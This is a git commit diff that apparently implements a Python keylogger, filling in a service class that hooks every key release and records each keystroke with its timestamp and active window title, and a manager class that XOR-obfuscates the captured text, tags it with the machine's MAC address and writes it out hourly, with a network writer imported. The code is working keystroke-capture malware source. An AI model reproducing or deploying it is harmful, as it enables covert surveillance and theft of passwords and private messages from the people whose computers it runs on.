9c44a795fd2a0df446d53005c83e3c635bab9a13
Oryan Menachem <om3160204@gmail.com>
2025-02-12 17:03:34 +0200

    'Full implementation of keylogger interface'

--- keylogger_manager.py
+++ keylogger_manager.py
@@ -3,11 +3,34 @@ from encryptor import Encryptor
 from writer import Iwriter
 from file_wirter import FileWriter
 from network_writer import NetworkWriter
+import time
+from getmac import get_mac_address
 
 class KeyloggerManager:
 
     def __init__(self):
-        pass
+        self.active = True
+        self.keylogger = KeyloggerService()
+        self.encryptor = Encryptor()
+        self.file_writer = FileWriter()
+        self.main()
+
 
     def main(self):
-        pass
+        while self.active:
+            data = self.keylogger.data
+            data = self.encryptor.xor(data)
+            # אולי עדיף להצפין את ה-mac
+            mac_name = self.get_mac()
+            wrapper = {mac_name : data}
+            #
+            self.file_writer.send_data(wrapper)
+            time.sleep(3600)
+
+    def stop(self):
+        self.active = False
+
+    @staticmethod
+    def get_mac():
+        return get_mac_address()
+
--- keylogger_service.py
+++ keylogger_service.py
@@ -1,28 +1,62 @@
-
+import keyboard
+from  datetime import datetime
+import pygetwindow as pw
 
 class KeyloggerService:
 
+    """
+    This class receives all user keystrokes with data on the keystrokes.
+    The data is the click time and the window in which it was pressed
+    """
+    # Initializing the class with a data field, and starting listening
     def __init__(self):
         self.__data = {}
+        self.start()
 
+    # מחזירה את הנתונים משדה __data ומאפסת את שדה זה
     @property
     def data(self):
-        pass
+        temp_data = self.__data
+        self.__data = {}
+        return temp_data
 
     def start(self):
-        pass
+        #
+        keyboard.on_release(self.handle_input)
 
-    def get_keyword(self):
-        pass
 
-    def get_time(self):
-        pass
+    def get_keyword(self,key: keyboard.KeyboardEvent):
+        key_name = key.name
+        # להבדיל בין תווים למקשים מיוחדים
+        # למצוא דרך לזהות לחיצה על כמה מקשים בו זמנית
+        # לתקן הצפנה של תווים מיוחדים
+        if len(key_name) > 1:
+            key_name = '~' + key_name + '~'
+        #
+
+        return key_name
+
+    def get_time(self,key: keyboard.KeyboardEvent):
+        key_time = key.time
+        key_time = datetime.fromtimestamp(key_time).strftime('%Y-%m-%d %H:%M')
+        return key_time
 
     def get_active_window(self):
-        pass
+        return pw.getActiveWindowTitle()
 
-    def handle_input(self):
-        pass
+    def handle_input(self,key):
+        active_window = self.get_active_window()
+        if active_window not in self.__data:
+            self.__data[active_window] = {}
 
-    def stop(self):
-        pass
+        current_time = self.get_time(key)
+        if current_time not in self.__data[active_window]:
+            self.__data[active_window][current_time] = ''
+
+        key_name = self.get_keyword(key)
+        self.__data[active_window][current_time] += key_name
+
+
+
+
+
